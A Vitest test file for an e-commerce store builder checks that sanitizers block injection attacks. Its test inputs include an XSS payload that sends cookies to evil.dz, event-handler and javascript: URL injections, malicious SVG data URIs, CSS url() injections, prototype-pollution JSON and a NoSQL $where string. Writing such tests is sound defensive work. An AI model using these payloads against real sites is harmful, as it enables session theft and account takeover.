import { describe, it, expect } from "vitest";
import {
  sanitizeStudioPayloadDeep,
  sanitizeStudioText,
  isSafeStudioUrl,
  sanitizeCssPositionValue,
  sanitizePixelId,
  redactStoreConfigForPublic,
  verifyStorePrelaunchPassword,
  sanitizeTrackEventPayload,
} from "../security/studioCyberSecurity";
import { sanitizeControlledCssClasses, sanitizeAnchorId } from "../components/Store/sections/responsiveInheritanceHelper";
import { safeNavigationHref } from "../components/Store/sections/safeNavigationHref";
import {
  resolveCategoryDeviceProfile,
  resolveCategoryGridCols,
  resolveResponsiveBentoSpan,
  resolveAntiHoleSpanClass,
} from "../components/Store/sections/category/categoryResponsiveHelper";
import { getCategoryLayoutCapabilities } from "../pages/Seller/StoreBuilder/constants/categoryCanvaOptions";
import { storeConfigSchema, customPageSectionSchema } from "../domains/seller/validators/storeLayout.schema";
import type { StoreConfig } from "../domains/seller/customPage.types";

describe("Bouclier Cyber-Sécurité Studio & Vitrine (Anti-Hacker Defense Suite)", () => {
  it("1. Bloque les injections XSS stockées (balises <script>, <iframe>, onerror=, javascript:)", () => {
    const dirtyTitle = `Collection Été <script>fetch('https://evil.dz/steal?c='+document.cookie)</script> Alger`;
    const cleaned = sanitizeStudioText(dirtyTitle);
    expect(cleaned).not.toContain("<script");
    expect(cleaned).not.toContain("</script>");
    expect(cleaned).toContain("Collection Été");

    const dirtyEvent = `Livraison 58 Wilayas" onmouseover="alert(1)" onerror="eval(window.name)`;
    const cleanedEvent = sanitizeStudioText(dirtyEvent);
    expect(cleanedEvent).not.toMatch(/onmouseover\s*=/i);
    expect(cleanedEvent).not.toMatch(/onerror\s*=/i);
  });

  it("2. Bloque les SVG piégés (data:image/svg+xml base64 & utf8 contenant <script> ou onload=)", () => {
    const maliciousSvgUtf8 = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`;
    expect(isSafeStudioUrl(maliciousSvgUtf8)).toBe(false);

    const rawScriptSvg = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>`;
    const maliciousSvgB64 = `data:image/svg+xml;base64,${Buffer.from(rawScriptSvg, "utf8").toString("base64")}`;
    expect(isSafeStudioUrl(maliciousSvgB64)).toBe(false);

    expect(isSafeStudioUrl("javascript:alert(document.domain)")).toBe(false);
    expect(isSafeStudioUrl("Java\tScript:alert(1)")).toBe(false);
    expect(isSafeStudioUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe(false);

    // Autorise les médias légitimes
    expect(isSafeStudioUrl("https://cdn.olmart.dz/stores/banner.webp")).toBe(true);
    expect(isSafeStudioUrl("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")).toBe(true);
  });

  it("3. Neutralise la Prototype Pollution (__proto__, constructor) et l'élévation de privilèges", () => {
    const rawHackerJson = JSON.parse(
      `{"shopName":"Maison Casbah","__proto__":{"polluted":true},"constructor":{"prototype":{"isAdmin":true}},"isAdmin":true,"customClaims":{"role":"super_admin"},"sellerTrustScore":999,"$where":"this.password == '123'"}`
    );

    const sanitized = sanitizeStudioPayloadDeep(rawHackerJson) as Record<string, unknown>;
    expect(sanitized.shopName).toBe("Maison Casbah");
    expect(sanitized.isAdmin).toBeUndefined();
    expect(sanitized.customClaims).toBeUndefined();
    expect(sanitized.sellerTrustScore).toBeUndefined();
    expect(sanitized.$where).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("4. Masque le mot de passe VIP (passwordProtectionCode) et les pages brouillons sur l'API publique", () => {
    const fullStoreConfig: StoreConfig = {
      sellerId: "seller_dz_01",
      shopName: "Atelier Oran",
      shopSlug: "atelier-oran",
      theme: {
        sector: "mode",
        primaryColor: "#111827",
        secondaryColor: "#374151",
        accentColor: "#D97706",
        fontFamily: "Inter",
      },
      seo: { metaTitle: "Atelier Oran", metaDescription: "Haute Couture" },
      storeStatus: {
        mode: "password",
        vacationMessage: "Ouverture VIP ce soir à 20h",
        passwordProtectionCode: "VIP-ALGER-2026",
        storefrontPassword: "LEGACY-SECRET-99",
      },
      customPages: [
        { id: "p1", title: "Page Publique", slug: "publique", isPublished: true, updatedAt: "2026-11-08" },
        { id: "p2", title: "Brouillon Secret", slug: "secret-draft", isPublished: false, updatedAt: "2026-11-08" },
      ],
      updatedAt: "2026-11-08T12:00:00.000Z",
    };

    const publicView = redactStoreConfigForPublic(fullStoreConfig);
    expect(publicView.storeStatus?.mode).toBe("password");
    expect(publicView.storeStatus?.isPasswordProtected).toBe(true);
    expect((publicView.storeStatus as unknown as Record<string, unknown>).passwordProtectionCode).toBeUndefined();
    expect((publicView.storeStatus as unknown as Record<string, unknown>).storefrontPassword).toBeUndefined();
    expect(publicView.customPages?.length).toBe(1);
    expect(publicView.customPages?.[0].slug).toBe("publique");

    // Vérification en temps constant (crypto.timingSafeEqual)
    expect(verifyStorePrelaunchPassword(fullStoreConfig, "VIP-ALGER-2026")).toBe(true);
    expect(verifyStorePrelaunchPassword(fullStoreConfig, "MAUVAIS-CODE")).toBe(false);
    expect(verifyStorePrelaunchPassword(fullStoreConfig, "")).toBe(false);
  });

  it("5. Bloque l'injection CSS dans customCssClasses, focalPoint et safeNavigationHref", () => {
    const maliciousCss = `shadow-lg expression(alert(1)) url(javascript:alert(1)) bg-white;background:url(//evil.com) valid-token`;
    const safeCss = sanitizeControlledCssClasses(maliciousCss);
    expect(safeCss).toBe("shadow-lg valid-token");

    expect(sanitizeCssPositionValue("50% 50%; background-image: url(https://evil.com)")).toBe("50% 50%");
    expect(sanitizeCssPositionValue("35% 70%")).toBe("35% 70%");

    expect(sanitizeAnchorId("# Promo <script>2026</script>")).toBe("promo-script-2026-script");
    expect(safeNavigationHref("javascript:alert(1)")).toBeUndefined();
    expect(safeNavigationHref("//evil.com/phishing")).toBeUndefined();
    expect(safeNavigationHref("/<script>alert(1)</script>")).toBeUndefined();
    expect(safeNavigationHref("#new-arrivals")).toBe("#new-arrivals");
    expect(safeNavigationHref("https://olmart.dz/boutique")).toBe("https://olmart.dz/boutique");
  });

  it("6. Valide les événements analytiques publics et bloque l'empoisonnement de Pixels", () => {
    expect(sanitizeTrackEventPayload({ eventType: "store_view", source: "instagram" }).valid).toBe(true);
    expect(sanitizeTrackEventPayload({ eventType: "__proto__", source: "<script>" }).valid).toBe(false);
    expect(sanitizePixelId("123456789012345")).toBe("123456789012345");
    expect(sanitizePixelId("12345'); alert(1);//")).toBeUndefined();
  });

  it("7. Valide les 9 secteurs d'univers et les liens d'en-tête dans storeConfigSchema tout en rejetant les URLs piégées", () => {
    const validParse = storeConfigSchema.safeParse({
      shopName: "Saveurs de Kabylie",
      shopSlug: "saveurs-kabylie",
      theme: { sector: "alimentation", primaryColor: "#2C3527" },
      headerConfig: {
        layout: "left",
        sticky: true,
        showSearch: true,
        showTrustBar: true,
        navLinks: [
          { id: "n1", label: "Livraison", target: "delivery" },
          { id: "n2", label: "Page Sur-Mesure", target: "page", pageSlug: "histoire-terroir" },
        ],
      },
      storeStatus: {
        mode: "password",
        passwordProtectionCode: "OLIVE-2026",
      },
    });
    expect(validParse.success).toBe(true);

    const poisonedUrlParse = storeConfigSchema.safeParse({
      shopName: "Boutique Piégée",
      logoUrl: "data:image/svg+xml;utf8,<svg onload=alert(1)></svg>",
    });
    expect(poisonedUrlParse.success).toBe(false);
  });

  it("8. Applique les règles Anti-Trou (4 cartes sur 3 col.), Bento Apple (2+1/1+2) et Options Contextuelles des 12 modèles", () => {
    const multiDeviceSettings = {
      layout: "bento" as const,
      layoutTablet: "grid" as const,
      layoutMobile: "bubbles" as const,
      cardSize: "large" as const,
      cardSizeTablet: "balanced" as const,
      cardSizeMobile: "compact" as const,
      aspectRatio: "16/9" as const,
      aspectRatioTablet: "4/5" as const,
      aspectRatioMobile: "1/1" as const,
      columns: 4 as const,
      columnsTablet: 2 as const,
      columnsMobile: 2 as const,
    };

    const pcProfile = resolveCategoryDeviceProfile(multiDeviceSettings, "desktop");
    expect(pcProfile).toEqual({
      device: "desktop",
      layout: "bento",
      cardSize: "large",
      aspectRatio: "16/9",
      columns: 4,
      hasCustomLayout: false,
      hasCustomCardSize: false,
      hasCustomAspectRatio: false,
    });

    const tabletProfile = resolveCategoryDeviceProfile(multiDeviceSettings, "tablet");
    expect(tabletProfile.columns).toBe(2);
    expect(tabletProfile.layout).toBe("grid");

    const mobileProfile = resolveCategoryDeviceProfile(multiDeviceSettings, "mobile");
    expect(mobileProfile.layout).toBe("bubbles");
    expect(mobileProfile.aspectRatio).toBe("circle");

    // RÈGLE 1 CORRIGÉE :
    // - Modèles modulaires à hauteur fixe (bento, glass-dock, overlay) : utilisent col-span-2
    expect([0, 1, 2, 3].map((idx) => resolveAntiHoleSpanClass(idx, 4, 3, "glass-dock"))).toEqual([
      "col-span-2",
      "col-span-1",
      "col-span-1",
      "col-span-2",
    ]);
    expect([0, 1, 2, 3].map((idx) => resolveAntiHoleSpanClass(idx, 4, 3, "overlay"))).toEqual([
      "col-span-2",
      "col-span-1",
      "col-span-1",
      "col-span-2",
    ]);

    // - Modèles symétriques stricts (arch, polaroid, bubbles, grid) : TOUJOURS col-span-1 + bascule en grid-cols-4 (ou grid-cols-2 en Grande)
    for (const symLayout of ["arch", "polaroid", "bubbles", "grid"]) {
      expect([0, 1, 2, 3].map((idx) => resolveAntiHoleSpanClass(idx, 4, 3, symLayout))).toEqual([
        "col-span-1",
        "col-span-1",
        "col-span-1",
        "col-span-1",
      ]);
      expect(resolveCategoryGridCols(3, 2, "balanced", "desktop", undefined, symLayout, 4)).toBe("grid-cols-4");
      expect(resolveCategoryGridCols(3, 2, "large", "desktop", undefined, symLayout, 4)).toBe("grid-cols-2");
    }

    // RÈGLE 2.1 : Bento Apple 4 cartes -> Carte #1 col-span-2, #2 col-span-1, #3 col-span-1, #4 col-span-2
    expect([0, 1, 2, 3].map((idx) => resolveResponsiveBentoSpan(idx, 4, "h-[180px]", "h-[160px]", "mobile", 2))).toEqual([
      "col-span-2 h-[180px]",
      "col-span-1 h-[160px]",
      "col-span-1 h-[160px]",
      "col-span-2 h-[180px]",
    ]);

    expect(resolveCategoryGridCols(4, 2, "balanced", "mobile", 2, "bubbles", 4)).toBe("grid-cols-2");
    expect(resolveCategoryGridCols(4, 2, "balanced", "tablet", undefined, "grid", 4)).toBe("grid-cols-2");

    // RÈGLE 3 : Options contextuelles intelligentes
    expect(getCategoryLayoutCapabilities("bento").supportsColumnsDesktop).toBe(false);
    expect(getCategoryLayoutCapabilities("accordion").supportsColumnsDesktop).toBe(false);
    expect(getCategoryLayoutCapabilities("magazine").supportsColumnsDesktop).toBe(false);
    expect(getCategoryLayoutCapabilities("carousel").supportsColumnsDesktop).toBe(false);
    expect(getCategoryLayoutCapabilities("mesh-3d").recommendedDesktopCols).toEqual([1, 2]);

    const sectionValidation = customPageSectionSchema.safeParse({
      id: "sec_cat_1",
      type: "featured_categories",
      settings: multiDeviceSettings,
    });
    expect(sectionValidation.success).toBe(true);
  });
});
